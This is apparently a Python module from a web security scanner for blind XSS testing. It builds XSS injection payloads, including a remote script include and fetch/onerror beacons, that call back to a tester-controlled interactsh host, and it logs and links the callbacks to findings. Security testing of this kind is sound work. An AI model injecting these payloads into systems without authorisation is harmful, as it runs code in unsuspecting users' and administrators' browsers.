"""
blind.py — blind / stored XSS via out-of-band (OOB) callbacks.

Blind XSS fires somewhere you can't see — an admin panel, a log viewer, a support
agent's screen — possibly hours later. You can't observe it in your own response,
so instead you inject a payload that 'phones home' to a server you control
(interactsh). When the payload eventually runs in some victim's browser, your
server records the hit — proof of execution, with the time, source IP, and
sometimes the page's DOM/cookies.

Two pieces:

  * make_blind_payloads(callback_host, marker) — payloads that beacon to a unique
    subdomain you control. The subdomain encodes WHICH injection it was, so a
    late callback can be traced back to the exact URL+parameter.

  * InteractshListener — runs `interactsh-client`, captures the registered
    domain, and writes every interaction into the datastore (optionally pinging
    Discord/Telegram). It can keep running long after the scan, because blind
    callbacks are slow.

If no interactsh domain is configured (or the client isn't installed), blind
injection is skipped with a clear message — the rest of the XSS module is
unaffected.
"""

from __future__ import annotations

import json
import logging
import re
import subprocess
import threading
import time
from dataclasses import dataclass

from core.config import ProgramConfig
from core.datastore import Datastore
from core.notify import send_notification
from core.tooling import is_available


def make_correlation_id(url: str, param: str) -> str:
    """A short, DNS-safe id that ties a callback back to an injection point."""
    import hashlib

    digest = hashlib.sha1(f"{url}|{param}".encode()).hexdigest()[:10]
    return f"bx{digest}"  # 'bx' = blind xss; all lowercase, DNS-safe


def make_blind_payloads(callback_host: str, marker: str) -> list[str]:
    """
    Payloads that beacon to `callback_host` (e.g. bx1234.<corr>.oast.fun).
    Benign: they only cause an outbound request to OUR server.
    """
    cb = callback_host
    return [
        f'"><script src=//{cb}></script>',
        f'"><img src=//{cb}/{marker}>',
        f"'><svg/onload=\"new Image().src='//{cb}/{marker}'\">",
        f'<img src=x onerror="fetch(`//{cb}/{marker}`)">',
        f"javascript:fetch('//{cb}/{marker}')",
    ]


@dataclass
class InteractshSession:
    domain: str = ""        # registered OOB domain, e.g. abcd.oast.fun
    running: bool = False


class InteractshListener:
    """
    Runs interactsh-client and records callbacks into the datastore.

    Usage:
        listener = InteractshListener(config, datastore, program_id)
        listener.start()         # spawns the client, captures listener.session.domain
        ...inject payloads using listener.callback_host(corr_id)...
        # callbacks accumulate in the datastore (callbacks table) as they arrive
        listener.stop()
    """

    # Matches the registered domain interactsh-client prints at startup.
    _DOMAIN_RE = re.compile(r"([a-z0-9]+\.[a-z0-9.\-]*oast\.[a-z]+)", re.IGNORECASE)

    def __init__(
        self,
        config: ProgramConfig,
        datastore: Datastore,
        program_id: int,
        logger: logging.Logger | None = None,
    ) -> None:
        self.config = config
        self.ds = datastore
        self.program_id = program_id
        self.log = logger or logging.getLogger("xss.blind")
        self.session = InteractshSession()
        self._proc: subprocess.Popen | None = None
        self._threads: list[threading.Thread] = []
        self._stop = threading.Event()

    def callback_host(self, correlation_id: str) -> str:
        """The host to embed in a payload for a given injection point."""
        base = self.session.domain or self.config.callback.interactsh_domain
        return f"{correlation_id}.{base}" if base else ""

    def start(self, wait_for_domain: float = 8.0) -> bool:
        if not is_available("interactsh-client"):
            self.log.warning("interactsh-client missing — blind XSS callbacks disabled")
            return False
        cmd = ["interactsh-client", "-json"]
        server = self.config.callback.interactsh_server
        if server:
            cmd += ["-server", server.replace("https://", "").replace("http://", "")]
        try:
            self._proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1,
            )
        except Exception as exc:
            self.log.warning("could not start interactsh-client: %s", exc)
            return False

        self.session.running = True
        reader = threading.Thread(target=self._read_loop, daemon=True)
        reader.start()
        self._threads.append(reader)

        # Wait briefly for the client to register and print its domain.
        deadline = time.time() + wait_for_domain
        while time.time() < deadline and not self.session.domain:
            time.sleep(0.2)
        if self.session.domain:
            self.log.info("interactsh ready: %s", self.session.domain)
            return True
        self.log.warning("interactsh-client started but no domain captured yet")
        return True

    def _read_loop(self) -> None:
        assert self._proc and self._proc.stdout
        for line in self._proc.stdout:
            if self._stop.is_set():
                break
            line = line.strip()
            if not line:
                continue
            # Try JSON (an interaction) first.
            try:
                obj = json.loads(line)
                self._handle_interaction(obj)
                continue
            except json.JSONDecodeError:
                pass
            # Otherwise it might be the startup banner carrying the domain.
            if not self.session.domain:
                m = self._DOMAIN_RE.search(line)
                if m:
                    self.session.domain = m.group(1).lower()

    def _handle_interaction(self, obj: dict) -> None:
        full_id = str(obj.get("full-id") or obj.get("unique-id") or "")
        protocol = str(obj.get("protocol", "")).lower()
        remote = str(obj.get("remote-address", ""))
        raw = obj.get("raw-request") or obj.get("raw-response") or json.dumps(obj)

        # The correlation id is the 'bx........' label we put in the subdomain.
        corr = ""
        m = re.search(r"(bx[0-9a-f]{10})", full_id)
        if m:
            corr = m.group(1)

        # Try to link the callback to the finding that injected this corr id.
        finding = self.ds.query_one(
            "SELECT id FROM findings WHERE program_id = ? AND evidence LIKE ? LIMIT 1",
            (self.program_id, f"%{corr}%"),
        ) if corr else None
        finding_id = int(finding["id"]) if finding else None

        self.ds.record_callback(
            program_id=self.program_id,
            correlation_id=corr or full_id,
            interaction=protocol,
            source_ip=remote,
            raw=str(raw)[:8000],
            finding_id=finding_id,
        )
        # A blind callback is high signal — mark the finding verified if linked.
        if finding_id:
            self.ds.update_finding_status(finding_id, "verified")

        self.log.info("BLIND CALLBACK: %s via %s from %s", corr or full_id, protocol, remote)
        send_notification(
            self.config.notifications,
            "Blind XSS callback fired",
            f"Program: {self.config.name}\nID: {corr or full_id}\n"
            f"Protocol: {protocol}\nSource: {remote}",
        )

    def stop(self) -> None:
        self._stop.set()
        self.session.running = False
        if self._proc:
            try:
                self._proc.terminate()
            except Exception:
                pass
